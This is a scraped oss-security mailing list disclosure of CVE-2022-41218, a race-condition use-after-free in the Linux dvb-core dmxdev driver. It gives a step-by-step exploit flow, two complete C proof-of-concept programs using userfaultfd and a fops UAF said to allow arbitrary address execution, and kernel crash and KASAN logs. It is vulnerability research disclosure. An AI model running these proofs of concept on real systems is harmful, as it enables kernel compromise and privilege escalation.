void dvb_free_device(struct dvb_device *dvbdev)
{
        if (!dvbdev)
                return;

        kfree (dvbdev->fops);
        kfree (dvbdev);    // target
}
EXPORT_SYMBOL(dvb_free_device);
```

6. When close(demux0) is executed, the dvb_demux_release() function is called and a UAF write vulnerability occurs in "dmxdev->dvbdev->users--;".
```
static int dvb_demux_release(struct inode *inode, struct file *file)
{
        struct dmxdev_filter *dmxdevfilter = file->private_data;
        struct dmxdev *dmxdev = dmxdevfilter->dev;
        int ret;

        ret = dvb_dmxdev_filter_free(dmxdev, dmxdevfilter);

        mutex_lock(&dmxdev->mutex);
        dmxdev->dvbdev->users--;    // here
        if (dmxdev->dvbdev->users == 1 && dmxdev->exit == 1) {
                mutex_unlock(&dmxdev->mutex);
                wake_up(&dmxdev->dvbdev->wait_queue);
        } else
                mutex_unlock(&dmxdev->mutex);

        return ret;
}
```
This UAF write vulnerability can be used, for example, to decrement the refcount of another structure.

The poc code is the same as the above vulnerability.

# vulnerability scope
The scope of this vulnerability is:

- drivers/media/usb/as102/as102_usb_drv.c
- drivers/media/usb/tm6000/tm6000-cards.c
- drivers/media/usb/pvrusb2/pvrusb2-dvb.c
- drivers/media/usb/au0828/au0828-core.c
- drivers/media/usb/cx231xx/cx231xx-cards.c
- drivers/media/usb/ttusb-dec/ttusb_dec.c
- drivers/media/usb/ttusb-budget/dvb-ttusb-budget.c
- drivers/media/usb/em28xx/em28xx-dvb.c
- drivers/media/usb/dvb-usb/cxusb.c
- drivers/media/usb/dvb-usb/dw2102.c
- drivers/media/usb/dvb-usb/dtt200u.c
- drivers/media/usb/dvb-usb/m920x.c
- drivers/media/usb/dvb-usb/dibusb-mb.c
- drivers/media/usb/dvb-usb/ttusb2.c
- drivers/media/usb/dvb-usb/pctv452e.c
- drivers/media/usb/dvb-usb/a800.c
- drivers/media/usb/dvb-usb/umt-010.c
- drivers/media/usb/dvb-usb/dtv5100.c
- drivers/media/usb/dvb-usb/dibusb-mc.c
- drivers/media/usb/dvb-usb/cinergyT2-core.c
- drivers/media/usb/dvb-usb/nova-t-usb2.c
- drivers/media/usb/dvb-usb/vp7045.c
- drivers/media/usb/dvb-usb/digitv.c
- drivers/media/usb/dvb-usb/gp8psk.c
- drivers/media/usb/dvb-usb/vp702x.c
- drivers/media/usb/dvb-usb/opera1.c
- drivers/media/usb/dvb-usb/technisat-usb2.c
- drivers/media/usb/dvb-usb/dib0700_core.c
- drivers/media/usb/dvb-usb/az6027.c
- drivers/media/usb/dvb-usb/af9005.c
- drivers/media/usb/dvb-usb-v2/au6610.c
- drivers/media/usb/dvb-usb-v2/zd1301.c
- drivers/media/usb/dvb-usb-v2/ce6230.c
- drivers/media/usb/dvb-usb-v2/ec168.c
- drivers/media/usb/dvb-usb-v2/gl861.c
- drivers/media/usb/dvb-usb-v2/dvbsky.c
- drivers/media/usb/dvb-usb-v2/az6007.c
- drivers/media/usb/dvb-usb-v2/lmedm04.c
- drivers/media/usb/dvb-usb-v2/anysee.c
- drivers/media/usb/dvb-usb-v2/mxl111sf.c
- drivers/media/usb/dvb-usb-v2/af9015.c
- drivers/media/usb/dvb-usb-v2/rtl28xxu.c
- drivers/media/usb/dvb-usb-v2/af9035.c

Best Regards,
Hyunwoo Kim.

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_e2da373e_20250114_211827.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](../../../2022/09/23/4) [[next>]](2) [[thread-next>]](2) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20220923190601.GA364453@ubuntu>
Date: Fri, 23 Sep 2022 12:06:01 -0700
From: Hyunwoo Kim <imv4bel@...il.com>
To: oss-security@...ts.openwall.com
Cc: imv4bel@...il.com
Subject: [Report v2] CVE-2022-41218: Linux dvb-core: UAF in dvb-core/dmxdev

Dear,

This security issue is a race-condition-to-UAF vulnerability that occurs in the dvb-core system.

CVE-2022-41218 has been assigned to this vulnerability.

# Introduction
This vulnerability is a race condition vulnerability that occurs in drivers/media/dvb-core/dmxdev.c.
Therefore, a race condition may occur in the usb device driver using this dmxdev.

This vulnerability could be used to trigger 3 UAFs.

# Vulnerability

## 1. vmalloc UAF write
First, the order of the exploit is as follows(I debugged using drivers/media/usb/ttusb-dec/ttusb_dec.c):
```
                cpu0                                            cpu1                                    cpu 2
                                                        1. dvb_dvr_open()
2. ttusb_dec_disconnect()
   ttusb_dec_exit_dvb()
   dvb_dmxdev_release()
   wait_event(dmxdev->dvr_dvbdev->wait_queue, …)
                                                                                                3. dvb_demux_open()
                                                                                                   dvb_demux_ioctl()
                                                                                                   dvb_usercopy()
                                                                                                   copy_from_user()  <- userfaultfd stuck
                                                        4. dvb_dvr_release()
5. vfree(dmxdev->filter)
                                                                                                6. copy_from_user()    <- userfaultfd release
                                                                                                   dvb_demux_do_ioctl()
                                                                                                   struct dmxdev *dmxdev = dmxdevfilter->dev;  <- UAF!!
```

The detailed exploit flow is as follows:

1. open() dvr0 among the device nodes. This calls dvb_dvr_open() to cause ‘dvbdev->users++’ to run.
In this case, when ttusb_dec_disconnect() is executed by removing the usb device, the ‘wait_event(dmxdev->dvr_dvbdev->wait_queue, …)’ condition is caught.

2. Physically remove the USB device.
In this case, while the ttusb_dec_disconnect() function is being executed, it waits at ‘wait_event(dmxdev->dvr_dvbdev->wait_queue, …)’.

3. open() the demux0 node so that the dvb_demux_open() function is called.
This function also executes ‘dvbdev->users++’ similarly to the dvb_dvr_open() function in step 1.
However, this improper reference counting occurs because the dvb_dmxdev_release() function that is currently waiting has already passed the check for dvbdev->users:
```
void dvb_dmxdev_release(struct dmxdev *dmxdev)
{
        dmxdev->exit = 1;
        if (dmxdev->dvbdev->users > 1) {    // This check is bypassed. improper reference counting.
                wait_event(dmxdev->dvbdev->wait_queue,
                                dmxdev->dvbdev->users == 1);
        }
        if (dmxdev->dvr_dvbdev->users > 1) {
                wait_event(dmxdev->dvr_dvbdev->wait_queue,    // Currently wait()ing here.
                                dmxdev->dvr_dvbdev->users == 1);
        }

        dvb_unregister_device(dmxdev->dvbdev);
        dvb_unregister_device(dmxdev->dvr_dvbdev);

        vfree(dmxdev->filter);
        dmxdev->filter = NULL;
        dmxdev->demux->close(dmxdev->demux);
}
```

It then calls ioctl() on demux0. When calling, the 3rd argument submits the user-space address set by userfaultfd(or FUSE fs).
Now while ioctl is running it will hang at copy_from_user() of dvb_usercopy():
```
int dvb_usercopy(struct file *file,
                     unsigned int cmd, unsigned long arg,
                     int (*func)(struct file *file,
                     unsigned int cmd, void *arg))
{
        char    sbuf[128];
        void    *mbuf = NULL;
        void    *parg = NULL;
        int     err  = -EINVAL;

        /*  Copy arguments into temp kernel buffer  */
        switch (_IOC_DIR(cmd)) {
        case _IOC_NONE:
                /*
                 * For this command, the pointer is actually an integer
                 * argument.
                 */
                parg = (void *) arg;
                break;
        case _IOC_READ: /* some v4l ioctls are marked wrong ... */
        case _IOC_WRITE:
        case (_IOC_WRITE | _IOC_READ):
                if (_IOC_SIZE(cmd) <= sizeof(sbuf)) {
                        parg = sbuf;
                } else {
                        /* too big to allocate from stack */
                        mbuf = kmalloc(_IOC_SIZE(cmd), GFP_KERNEL);
                        if (NULL == mbuf)
                                return -ENOMEM;
                        parg = mbuf;
                }

                err = -EFAULT;
                if (copy_from_user(parg, (void __user *)arg, _IOC_SIZE(cmd)))   // here
                        goto out;
                break;
        }
```

4. close() the fd in the thread that open()ed the dvr0 node.
Then dvb_dvr_release() is called, and ‘dvbdev->users--’ and ‘wake_up(&dvbdev->wait_queue)’ are executed to wake up the dvb_dmxdev_release() function, which is the .disconnect flow.

5. In the .disconnect flow, dvb_dmxdev_release() function, vfree(dmxdev->filter) is executed.

6. Release userfaultfd from the demux0 ioctl thread that set userfaultfd.
This will cause the UAF to occur by reading the ‘dmxdev->filter’ address you just released from .disconnect.
UAF can now be used in all cases of dvb_demux_do_ioctl(), and even LPE is possible when linked with BPF.

Here is the PoC code:
```
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <malloc.h>
#include <poll.h>
#include <pty.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <linux/userfaultfd.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/un.h>
#include <linux/netlink.h>
#include <stddef.h>
#include <sys/param.h>
#include <sys/resource.h>
#include <linux/bpf.h>
#include <linux/ioctl.h>
#include <linux/types.h>

#include <linux/dvb/dmx.h>

#define CPU_0 1
#define CPU_1 2
#define CPU_2 3
#define CPU_3 4
#define UFFD_COUNT 1

#define die() do { \
        fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
        exit(EXIT_FAILURE); \
} while (0)

int fd;
int page_size;
int set1 = 0;
int set2 = 0;
int set3 = 0;
char *addr;
char *leak_addr;
char *text_addr;

void set_affinity(unsigned long mask) {
        if (pthread_setaffinity_np(pthread_self(), sizeof(mask), (cpu_set_t *)&mask) < 0) {
                perror("pthread_setaffinity_np");
        }
        return;
}

static void *fault_handler_thread(void *arg) {
        static struct uffd_msg msg;
        long uffd;
        static char *page = NULL;
        struct uffdio_copy uffdio_copy;
        ssize_t nread;
        int qid;
        uintptr_t fault_addr;

        uffd = (long)arg;

        if (page == NULL) {
                page = mmap(NULL, page_size,
                                PROT_READ | PROT_WRITE,
                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
                if (page == MAP_FAILED){
                        perror("mmap");
                        die();
                }
        }

        for (;;) {
                struct pollfd pollfd;
                int nready;
                pollfd.fd = uffd;
                pollfd.events = POLLIN;
                nready = poll(&pollfd, 1, -1);
                if (nready == -1) {
                        perror("poll");
                        die();
                }

                nread = read(uffd, &msg, sizeof(msg));
                if (nread == 0) {
                        printf("EOF on userfaultfd!\n");
                        die();
                }

                if (nread == -1) {
                        perror("read");
                        die();
                }

                if (msg.event != UFFD_EVENT_PAGEFAULT) {
                        perror("Unexpected event on userfaultfd");
                        die();
                }

                fault_addr = msg.arg.pagefault.address;

                if (fault_addr == addr) {
                        printf("[step 4] ioctl ufd  pid : %ld\n", syscall(SYS_gettid));

                        set2 = 1;
                        while(!set3);

                        sleep(5);

                        uffdio_copy.src = (unsigned long)page;
                        uffdio_copy.dst = (unsigned long)msg.arg.pagefault.address & ~(page_size - 1);
                        uffdio_copy.len = page_size;
                        uffdio_copy.mode = 0;
                        uffdio_copy.copy = 0;
                        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1) {
                                perror("fault_handler_thread() - ioctl-UFFDIO_COPY case 1");
                                die();
                        }

                }
        }
}

void set_userfaultfd(void) {
        long uffd[UFFD_COUNT];
        struct uffdio_api uffdio_api[UFFD_COUNT];
        struct uffdio_register uffdio_register;
        pthread_t pf_hdr[UFFD_COUNT];
        int p[UFFD_COUNT];
        unsigned int size;

        size = page_size;

        addr = (char *)mmap(NULL,
                        page_size * UFFD_COUNT,
                        PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS,
                        -1, 0);

        for (int i = 0; i < UFFD_COUNT; i++) {
                uffd[i] = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
                if (uffd[i] == -1) {
                        perror("syscall : userfaultfd");
                        die();
                }

                uffdio_api[i].api = UFFD_API;
                uffdio_api[i].features = 0;
                if (ioctl(uffd[i], UFFDIO_API, &uffdio_api[i]) == -1) {
                        perror("ioctl() : UFFDIO_API");
                        die();
                }

                uffdio_register.range.start = (unsigned long)(addr + (page_size * i));
                uffdio_register.range.len   = size;
                uffdio_register.mode        = UFFDIO_REGISTER_MODE_MISSING;
                if (ioctl(uffd[i], UFFDIO_REGISTER, &uffdio_register) == -1) {
                        perror("ioctl() : UFFDIO_REGISTER");
                        die();
                }

                p[i] = pthread_create(&pf_hdr[i], NULL, fault_handler_thread, (void *)uffd[i]);
                if (p[i] != 0) {
                        perror("pthread_create : page_fault_handler_thread");
                        die();
                }
        }
}

void *dvb_wait_queue(void) {
        int fd;
        int ret;

        //set_affinity(CPU_2);

        fd = open("/dev/dvb/adapter0/dvr0", O_RDONLY);
        if (fd > 0) {
                printf("[step 1] dvr0 open() : %d  pid : %ld\n", fd, syscall(SYS_gettid));
        } else {
                perror("/dev/dvb/adapter0/dvr0 open() failed");
                die();
        }
        set1 = 1;

        while(!set2);
        sleep(5);

        close(fd);
        printf("[step 5] dvr0 close()  pid : %ld\n", syscall(SYS_gettid));

        sleep(5);
        set3 = 1;
}

void *demux_ioctl(void) {
        int ret;
        unsigned char tmp;
        char input[2];
        int fd;

        //set_affinity(CPU_1);

        while(!set1);
        printf("Disconnect now (After disconnecting, type enter)\n");
        read(0, input, 1);
        printf("[step 2] disconnect dvb usb\n");

        fd = open("/dev/dvb/adapter0/demux0", O_RDWR);
        if (fd > 0) {
                printf("[step 3] demux0 open() : %d  pid : %ld\n", fd, syscall(SYS_gettid));

        } else {
                perror("/dev/dvb/adapter0/demux0 open() failed");
                die();
        }

        ret = ioctl(fd, DMX_SET_FILTER, addr);
        printf("[step 6] demux0 ioctl()  ret : %d  pid : %ld\n", ret, syscall(SYS_gettid));

        sleep(5);
}

int main() {
        pthread_t pf_hdr;
        int p1, p2;
        int status1, status2;
        pthread_t hdr1, hdr2;
        int ret;

        page_size = sysconf(_SC_PAGE_SIZE);

        //set_affinity(CPU_0);

        set_userfaultfd();

        p1 = pthread_create(&hdr1, NULL, dvb_wait_queue, (void *)NULL);
        if (p1 != 0) {
                perror("pthread_create 1");
                die();
        }

        p2 = pthread_create(&hdr2, NULL, demux_ioctl, (void *)NULL);
        if (p2 != 0) {
                perror("pthread_create 2");
                die();
        }

        pthread_join(hdr1, (void **)&status1);
        pthread_join(hdr2, (void **)&status2);

        return 0;
}
```

The kernel log looks like this:
```
[   83.990720] BUG: unable to handle page fault for address: ffffc900013c5060
[   83.990733] #PF: supervisor read access in kernel mode
[   83.990739] #PF: error_code(0x0000) - not-present page
[   83.990744] PGD 100000067 P4D 100000067 PUD 1001dd067 PMD 1078fc067 PTE 0
[   83.990760] Oops: 0000 [#1] PREEMPT SMP NOPTI
[   83.990768] CPU: 2 PID: 2580 Comm: exploit Not tainted 6.0.0-rc2+ #3
[   83.990776] Hardware name: Gigabyte Technology Co., Ltd. B460MDS3H/B460M DS3H, BIOS F3 05/27/2020
[   83.990781] RIP: 0010:dvb_demux_do_ioctl+0x22/0x5b0 [dvb_core]
[   83.990809] Code: 00 00 00 00 0f 1f 40 00 0f 1f 44 00 00 55 48 89 e5 41 57 49 89 d7 41 56 41 55 41 54 53 89 f3 48 84
[   83.990816] RSP: 0018:ffffc90001a3fd10 EFLAGS: 00010282
[   83.990824] RAX: 0000000000000000 RBX: 00000000403c6f2b RCX: ffffffffc051c520
[   83.990830] RDX: ffffc90001a3fd80 RSI: 00000000403c6f2b RDI: ffff88810c4adc00
[   83.990835] RBP: ffffc90001a3fd58 R08: 0000000000000000 R09: 0000000000000000
[   83.990840] R10: 0000000000000000 R11: 0000000000000000 R12: 00000000fffffff2
[   83.990845] R13: ffffc900013c5000 R14: ffff88810c4adc00 R15: ffffc90001a3fd80
[   83.990850] FS:  00007f0c4fdd7640(0000) GS:ffff88844ea80000(0000) knlGS:0000000000000000
[   83.990857] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   83.990863] CR2: ffffc900013c5060 CR3: 000000010b31e001 CR4: 00000000007706e0
[   83.990869] PKRU: 55555554
[   83.990873] Call Trace:
[   83.990877]  <TASK>
[   83.990886]  dvb_usercopy+0x55/0x1a0 [dvb_core]
[   83.990907]  ? dvb_dmxdev_filter_start+0x3b0/0x3b0 [dvb_core]
[   83.990932]  dvb_demux_ioctl+0x15/0x20 [dvb_core]
[   83.990951]  __x64_sys_ioctl+0x92/0xd0
[   83.990965]  do_syscall_64+0x59/0x90
[   83.990973]  ? debug_smp_processor_id+0x17/0x20
[   83.990984]  ? fpregs_assert_state_consistent+0x2a/0x50
[   83.990995]  ? exit_to_user_mode_prepare+0x49/0x1a0
[   83.991007]  ? syscall_exit_to_user_mode+0x26/0x50
[   83.991016]  ? __x64_sys_write+0x19/0x20
[   83.991024]  ? do_syscall_64+0x69/0x90
[   83.991030]  ? irqentry_exit_to_user_mode+0x9/0x20
[   83.991039]  ? irqentry_exit+0x3b/0x50
[   83.991048]  ? exc_page_fault+0x87/0x180
[   83.991056]  entry_SYSCALL_64_after_hwframe+0x63/0xcd
[   83.991068] RIP: 0033:0x454b7f
[   83.991075] Code: 00 48 89 44 24 18 31 c0 48 8d 44 24 60 c7 04 24 10 00 00 00 48 89 44 24 08 48 8d 44 24 20 48 89 40
[   83.991081] RSP: 002b:00007f0c4fdd7150 EFLAGS: 00000246 ORIG_RAX: 0000000000000010
[   83.991090] RAX: ffffffffffffffda RBX: 00007f0c4fdd7640 RCX: 0000000000454b7f
[   83.991095] RDX: 00007f0c50dda000 RSI: 00000000403c6f2b RDI: 0000000000000005
[   83.991100] RBP: 00007f0c4fdd71d0 R08: 0000000000000000 R09: 0000000000000000
[   83.991104] R10: 000000000000000a R11: 0000000000000246 R12: 00007f0c4fdd7640
[   83.991109] R13: 0000000000000000 R14: 000000000041ba00 R15: 00007f0c4f5d7000
[   83.991118]  </TASK>
[   83.991121] Modules linked in: snd_usb_audio usbhid hid snd_usbmidi_lib ttusb_dec ttusbdecfe dvb_core mc snd_sof_pca
[   83.991249]  sysfillrect rapl sysimgblt snd intel_cstate mei_me soundcore ee1004 mei gigabyte_wmi wmi_bmof serial_mt
[   83.991333] CR2: ffffc900013c5060
[   83.991339] ---[ end trace 0000000000000000 ]---
[   83.991344] RIP: 0010:dvb_demux_do_ioctl+0x22/0x5b0 [dvb_core]
[   83.991366] Code: 00 00 00 00 0f 1f 40 00 0f 1f 44 00 00 55 48 89 e5 41 57 49 89 d7 41 56 41 55 41 54 53 89 f3 48 84
[   83.991372] RSP: 0018:ffffc90001a3fd10 EFLAGS: 00010282
[   83.991378] RAX: 0000000000000000 RBX: 00000000403c6f2b RCX: ffffffffc051c520
[   83.991383] RDX: ffffc90001a3fd80 RSI: 00000000403c6f2b RDI: ffff88810c4adc00
[   83.991387] RBP: ffffc90001a3fd58 R08: 0000000000000000 R09: 0000000000000000
[   83.991392] R10: 0000000000000000 R11: 0000000000000000 R12: 00000000fffffff2
[   83.991396] R13: ffffc900013c5000 R14: ffff88810c4adc00 R15: ffffc90001a3fd80
[   83.991401] FS:  00007f0c4fdd7640(0000) GS:ffff88844ea80000(0000) knlGS:0000000000000000
[   83.991407] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   83.991412] CR2: ffffc900013c5060 CR3: 000000010b31e001 CR4: 00000000007706e0
[   83.991417] PKRU: 55555554
```

## 2. UAF that allows arbitrary address execution
First, the order of the exploit is as follows:
```
                cpu0                                            cpu1                                    cpu 2
                                                        1. dvb_dvr_open()
2. ttusb_dec_disconnect()
   ttusb_dec_exit_dvb()
   dvb_dmxdev_release()
   wait_event(dmxdev->dvr_dvbdev->wait_queue, ...)
                                                                                                3. dvb_demux_open()
                                                        4. dvb_dvr_release()
5. dvb_unregister_device(dmxdev->dvbdev)
   dvb_free_device()
   kfree (dvbdev->fops)
                                                                                                6. close(demux0)
                                                                                                   __x64_sys_close()
                                                                                                   close_fd()
                                                                                                   filp_close()
                                                                                                   filp->f_op->flush(filp, id);  <- UAF!!
```

The detailed exploit flow is as follows:

1 ~ 4. The order of 1-4 is the same as the first vulnerability.

5. In the .disconnect flow, "dvb_unregister_device(dmxdev->dvbdev) -> dvb_free_device() -> kfree (dvbdev->fops)" is executed.
Here, kfree()ed "dvbdev->fops" is the target of UAF vulnerability.

6. close() the demux0 fd in the thread that open()ed the demux0 node.
In fact, when opening a dvb device node such as demux0, "dvb_device_open()" is called first, not dvb_XXX_open():
```
static int dvb_device_open(struct inode *inode, struct file *file)
{
        struct dvb_device *dvbdev;

        mutex_lock(&dvbdev_mutex);
        down_read(&minor_rwsem);
        dvbdev = dvb_minors[iminor(inode)];

        if (dvbdev && dvbdev->fops) {
                int err = 0;
                const struct file_operations *new_fops;

                new_fops = fops_get(dvbdev->fops);
                if (!new_fops)
                        goto fail;
                file->private_data = dvbdev;
                replace_fops(file, new_fops);    // replace fops here.
                if (file->f_op->open)
                        err = file->f_op->open(inode, file);    // call dvb_XXX_open()
                up_read(&minor_rwsem);
                mutex_unlock(&dvbdev_mutex);
                return err;
        }
fail:
        up_read(&minor_rwsem);
        mutex_unlock(&dvbdev_mutex);
        return -ENODEV;
}
```
After the above function is called, "replace_fops(file, new_fops);" to replace file->f_op with "dvbdev->fops".
This "dvbdev->fops" is the target of this UAF vulnerability, as explained in step 5.

Returning to the flow, the close() system calls are executed in the order of "__x64_sys_close() -> close_fd() -> filp_close()" because close(demux0) was called:
```
int filp_close(struct file *filp, fl_owner_t id)
{
        int retval = 0;

        if (!file_count(filp)) {
                printk(KERN_ERR "VFS: Close: file count is 0\n");
                return 0;
        }

        if (filp->f_op->flush)
                retval = filp->f_op->flush(filp, id);    // UAF!!

        if (likely(!(filp->f_mode & FMODE_PATH))) {
                dnotify_flush(filp, id);
                locks_remove_posix(filp, id);
        }
        fput(filp);
        return retval;
}
```
In the above function, "filp->f_op->flush(filp, id);" is called, and UAF occurs because this f_op is the fops kfree()ed in step 5.
This, in conjunction with kmalloc heap spraying, becomes a vulnerability that can execute any desired address.

Here is the PoC code:
```
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <malloc.h>
#include <poll.h>
#include <pty.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <linux/userfaultfd.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/un.h>
#include <linux/netlink.h>
#include <stddef.h>
#include <sys/param.h>
#include <sys/resource.h>
#include <linux/bpf.h>
#include <linux/ioctl.h>
#include <linux/types.h>

#include <linux/dvb/dmx.h>

#define CPU_0 1
#define CPU_1 2
#define CPU_2 3
#define CPU_3 4

#define die() do { \
        fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
        exit(EXIT_FAILURE); \
} while (0)

int fd;
int set1 = 0;
int set2 = 0;
int set3 = 0;

void set_affinity(unsigned long mask) {
        if (pthread_setaffinity_np(pthread_self(), sizeof(mask), (cpu_set_t *)&mask) < 0) {
                perror("pthread_setaffinity_np");
        }
        return;
}

void *dvb_wait_queue(void) {
        int fd;
        int ret;

        //set_affinity(CPU_2);

        fd = open("/dev/dvb/adapter0/dvr0", O_RDONLY);
        if (fd > 0) {
                printf("[step 1] dvr0 open() : %d  pid : %ld\n", fd, syscall(SYS_gettid));
        } else {
                perror("/dev/dvb/adapter0/dvr0 open() failed");
                die();
        }
        set1 = 1;

        while(!set2);
        close(fd);
        set3 = 1;
        printf("[step 4] dvr0 close()  pid : %ld\n", syscall(SYS_gettid));

        sleep(5);
}

void *demux_close(void) {
        int ret;
        unsigned char tmp;
        char input[2];
        int fd;

        //set_affinity(CPU_1);

        while(!set1);
        printf("Disconnect now (After disconnecting, type enter) : \n");
        read(0, input, 1);
        printf("[step 2] disconnect dvb usb\n");

        fd = open("/dev/dvb/adapter0/demux0", O_RDWR);
        if (fd > 0) {
                printf("[step 3] demux0 open() : %d  pid : %ld\n", fd, syscall(SYS_gettid));

        } else {
                perror("/dev/dvb/adapter0/demux0 open() failed");
                die();
        }
        set2 = 1;

        while(!set3);
        usleep(60);
        close(fd);
        printf("[step 5] demux0 close()  pid : %ld\n", syscall(SYS_gettid));

        sleep(5);
}

int main() {
        pthread_t pf_hdr;
        int p1, p2;
        int status1, status2;
        pthread_t hdr1, hdr2;
        int ret;

        //set_affinity(CPU_0);

        p1 = pthread_create(&hdr1, NULL, dvb_wait_queue, (void *)NULL);
        if (p1 != 0) {
                perror("pthread_create 1");
                die();
        }

        p2 = pthread_create(&hdr2, NULL, demux_close, (void *)NULL);
        if (p2 != 0) {
                perror("pthread_create 2");
                die();
        }

        pthread_join(hdr1, (void **)&status1);
        pthread_join(hdr2, (void **)&status2);

        return 0;
}
```

Here is the KASAN log:
```
[  708.982899] ==================================================================
[  708.982921] BUG: KASAN: use-after-free in filp_close+0x119/0x140
[  708.982929] Read of size 8 at addr ffff888114bd4078 by task exploit2/2918

[  708.982933] CPU: 7 PID: 2918 Comm: exploit2 Not tainted 6.0.0-rc2+ #4
[  708.982936] Hardware name: Gigabyte Technology Co., Ltd. B460MDS3H/B460M DS3H, BIOS F3 05/27/2020
[  708.982938] Call Trace:
[  708.982954]  <TASK>
[  708.982956]  dump_stack_lvl+0x49/0x63
[  708.982960]  print_report.cold+0x5e/0x5d9
[  708.982963]  ? filp_close+0x119/0x140
[  708.982966]  kasan_report+0xa0/0x120
[  708.982969]  ? filp_close+0x119/0x140
[  708.982972]  __asan_report_load8_noabort+0x14/0x20
[  708.982975]  filp_close+0x119/0x140
[  708.982978]  close_fd+0x75/0x90
[  708.982981]  __x64_sys_close+0x30/0x80
[  708.982984]  do_syscall_64+0x59/0x90
[  708.982987]  ? syscall_exit_to_user_mode+0x26/0x50
[  708.982990]  ? do_syscall_64+0x69/0x90
[  708.982994]  ? syscall_exit_to_user_mode+0x26/0x50
[  708.983017]  ? __do_sys_gettid+0x1b/0x30
[  708.983022]  ? do_syscall_64+0x69/0x90
[  708.983027]  ? exit_to_user_mode_prepare+0x49/0x1a0
[  708.983035]  ? irqentry_exit_to_user_mode+0x9/0x20
[  708.983041]  ? irqentry_exit+0x3b/0x50
[  708.983045]  ? exc_page_fault+0x72/0xf0
[  708.983050]  entry_SYSCALL_64_after_hwframe+0x63/0xcd
[  708.983072] RIP: 0033:0x45396b
[  708.983077] Code: 03 00 00 00 0f 05 48 3d 00 f0 ff ff 77 41 c3 48 83 ec 18 89 7c 24 0c e8 33 a9 02 00 8b 7c 24 0c 41 89 c0 b8 03 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 35 44 89 c7 89 44 24 0c e8 81 a9 02 00 8b 44
[  708.983081] RSP: 002b:00007f55128b41a0 EFLAGS: 00000293 ORIG_RAX: 0000000000000003
[  708.983087] RAX: ffffffffffffffda RBX: 00007f55128b4640 RCX: 000000000045396b
[  708.983091] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000004
[  708.983094] RBP: 00007f55128b41d0 R08: 0000000000000000 R09: 0000000000000000
[  708.983097] R10: 0000000000000000 R11: 0000000000000293 R12: 00007f55128b4640
[  708.983100] R13: 0000000000000000 R14: 000000000041b3e0 R15: 00007f55120b4000
[  708.983107]  </TASK>

[  708.983130] Allocated by task 663:
[  708.983133]  kasan_save_stack+0x26/0x50
[  708.983137]  __kasan_kmalloc+0xae/0xe0
[  708.983140]  __kmalloc_node+0x185/0x420
[  708.983145]  memcg_alloc_slab_cgroups+0x8a/0x130
[  708.983149]  allocate_slab+0x389/0x4a0
[  708.983152]  ___slab_alloc+0x6c5/0xa50
[  708.983155]  __slab_alloc.constprop.0+0x5a/0xb0
[  708.983159]  kmem_cache_alloc+0x2e3/0x320
[  708.983162]  seq_open+0x57/0x160
[  708.983166]  kernfs_fop_open+0x4f0/0xc10
[  708.983171]  do_dentry_open+0x404/0xf80
[  708.983174]  vfs_open+0x9f/0xd0
[  708.983177]  path_openat+0xd58/0x3f60
